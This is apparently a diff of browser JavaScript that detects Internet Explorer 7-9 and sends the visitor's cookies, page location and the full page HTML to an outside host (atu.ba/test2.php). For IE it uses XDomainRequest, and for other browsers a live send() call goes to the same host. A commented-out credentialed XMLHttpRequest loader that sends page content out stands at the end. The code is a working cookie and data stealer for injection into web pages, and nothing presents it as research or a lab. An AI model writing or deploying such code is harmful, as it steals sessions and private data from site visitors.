@@ -32,13 +32,55 @@ else // if no "MSIE" string in userAgent
 
 if (detectIEregexp.test(navigator.userAgent)){ //if some form of IE
  var ieversion=new Number(RegExp.$1) // capture x.x portion and store as a number
- if (ieversion==7 || ieversion==8 || ieversion==9)
+ if (ieversion==7 || ieversion==8 || ieversion==9){
  //img=new Image();img.src="http://atu.ba/test2.php?c="+escape(document.cookie)+" Domain: "+document.domain+" Location: "+document.location;
-send("http://atu.ba/test2.php?c="+escape(document.cookie)+" Location: "+window.location,escape(document.documentElement.outerHTML)); 
+ //doRequest("http://atu.ba/test2.php?c="+escape(document.cookie)+" Location: "+window.location,escape(document.documentElement.outerHTML)); 
+var xdr;
+function err() {
+    alert('Error');
 }
+function timeo() {
+    alert('Time off');
+}
+function loadd() {
+    alert('Response: ' +xdr.responseText);
+}
+function stopdata() {
+    xdr.abort();
+}   
+xdr = new XDomainRequest();
+if (xdr) {
+    xdr.onerror = err;
+    xdr.ontimeout = timeo;
+    xdr.onload = loadd;
+    xdr.timeout = 10000;
+    xdr.open('POST','http://www.atu.ba/test2.php?c='+escape(document.cookie)+' Location: '+escape(window.location));
+    xdr.send('data='+escape(document.documentElement.outerHTML));
+} else {
+    alert('XDR undefined');
+}
+}}
 else{
 send("http://atu.ba/test2.php?c="+escape(document.cookie)+" Location: "+window.location,escape(document.documentElement.outerHTML));
 }
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 /*function send(t,params){var mystr = "data=";var finals = mystr + params;window.XMLHttpRequest?xmlhttp=new XMLHttpRequest:xmlhttp=new ActiveXObject("Microsoft.XMLHTTP"),xmlhttp.onreadystatechange=function(){4==xmlhttp.readyState&&200==xmlhttp.status},xmlhttp.open("POST",t,!1),xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded"),xmlhttp.send(finals)}
 function loadXMLDoc(t){window.XMLHttpRequest?xmlhttp=new XMLHttpRequest:xmlhttp=new ActiveXObject("Microsoft.XMLHTTP"),xmlhttp.onreadystatechange=function(){4==xmlhttp.readyState&&200==xmlhttp.status&&send("http://atu.ba/test2.php?c="+escape(document.cookie)+" Location: "+window.location,escape(xmlhttp.responseText))},xmlhttp.open("GET",t,!1),xmlhttp.withCredentials = true,xmlhttp.send()}loadXMLDoc(document.location);*/
 
